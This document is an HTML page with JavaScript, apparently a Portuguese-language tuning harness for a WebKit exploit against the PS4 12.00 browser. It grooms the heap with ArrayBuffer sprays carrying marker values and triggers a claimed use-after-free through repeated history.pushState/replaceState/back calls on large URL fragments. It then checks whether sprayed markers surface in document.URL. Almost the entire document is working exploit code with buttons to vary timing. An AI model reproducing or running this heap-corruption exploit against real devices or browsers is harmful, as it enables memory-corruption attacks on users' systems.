<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Timing Tuner</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
    h2 { border-bottom: 2px solid #0f0; padding-bottom: 10px; }
    .btn-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-bottom: 20px; }
    button { 
        padding: 15px 25px; font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #003300; color: #fff; flex: 1; min-width: 120px;
    }
    button:hover { background: #005500; }
    #log { 
        border: 1px solid #333; margin-top: 20px; padding: 10px; 
        white-space: pre-wrap; height: 350px; overflow-y: scroll; 
        text-align: left; background: #111; font-size: 13px;
    }
    .pwned { background-color: #fff; color: #000; font-size: 1.5em; font-weight: bold; padding: 10px; border: 5px solid #0f0; }
</style>
</head>
<body>

<h2>PS4 12.00 - CALIBRAGEM DE TIMING</h2>
<div id="status">Escolha um Loop para testar o Bucket 64 (CCCC)</div>

<div class="btn-group">
    <button onclick="runExploit(40)">LOOP 40</button>
    <button onclick="runExploit(45)">LOOP 45</button>
    <button onclick="runExploit(48)">LOOP 48 (Original)</button>
</div>
<div class="btn-group">
    <button onclick="runExploit(52)">LOOP 52</button>
    <button onclick="runExploit(60)">LOOP 60</button>
    <button onclick="runExploit(70)">LOOP 70</button>
</div>

<div id="log">Aguardando comando...</div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    const d = document.createElement("div");
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

// === PAYLOAD ORIGINAL DO SUCESSO ===
// Voltamos ao CCCC para garantir que o problema é só timing
function createFakeObject(size, marker) {
    try {
        let buf = new ArrayBuffer(size);
        let view = new Uint32Array(buf);
        for(let i=0; i<view.length; i++) view[i] = marker;
        return buf;
    } catch(e) { return null; }
}

async function runExploit(loopCount) {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = `Rodando com Loop ${loopCount}...`;
    log(`>>> INICIANDO TESTE COM LOOP ${loopCount} <<<`);

    // ESTRUTURA SHOTGUN (A que funcionou)
    // Mantemos os vizinhos (80, 96, 128) para garantir o "Feng Shui"
    const BUCKETS = [
        { size: 80,  marker: 0x41414141 }, // AAAA
        { size: 96,  marker: 0x42424242 }, // BBBB
        { size: 64,  marker: 0x43434343 }, // CCCC (ALVO)
        { size: 128, marker: 0x44444444 }  // DDDD
    ];

    log("1. Grooming (Preparação)...");
    for(let b of BUCKETS) {
        for(let k=0; k<150; k++) keepAlive.push(createFakeObject(b.size, b.marker));
    }
    
    // Swiss Cheese
    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);

    log("2. Disparando UAF...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < loopCount; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        // Gatilho de Timeout
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // MOMENTO DO SPRAY (Última volta)
        if (i === (loopCount - 1)) {
            log(`>>> SPRAY MASSIVO NO LOOP ${i} <<<`);
            
            setTimeout(() => history.back(), 0);
            
            // AUMENTO DE POTÊNCIA: 1000 objetos em vez de 200
            // Tentativa de "inundar" o heap para garantir que um entre
            for(let k=0; k<1000; k++) {
                for(let b of BUCKETS) {
                    keepAlive.push(createFakeObject(b.size, b.marker));
                }
            }
            
            setTimeout(() => { 
                 for(let i=0; i<4; i++) new ArrayBuffer(8*1024*1024);
            }, 20); 
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(500);
    checkResult(loopCount);
}

function checkResult(lc) {
    let url = document.URL;
    let found = false;
    
    // Procura por CCCC
    if (url.indexOf("CCCC") !== -1) {
        found = true;
        log("!!! SUCESSO ABSOLUTO !!!");
        log(`O Loop vencedor foi: ${lc}`);
        log("Alvo confirmado: CCCC (64 bytes)");
        statusEl.innerText = `VITÓRIA NO LOOP ${lc}!`;
        statusEl.className = "pwned";
        return;
    }

    // Procura outros
    if (url.indexOf("AAAA") !== -1) log("Aviso: AAAA (80) entrou. Quase lá.");
    if (url.indexOf("BBBB") !== -1) log("Aviso: BBBB (96) entrou.");
    
    if(!found) {
        log(`Falha no Loop ${lc}. Tente outro botão.`);
        statusEl.innerText = "Falha. Tente outro Loop.";
    }
}
</script>
</body>
</html>
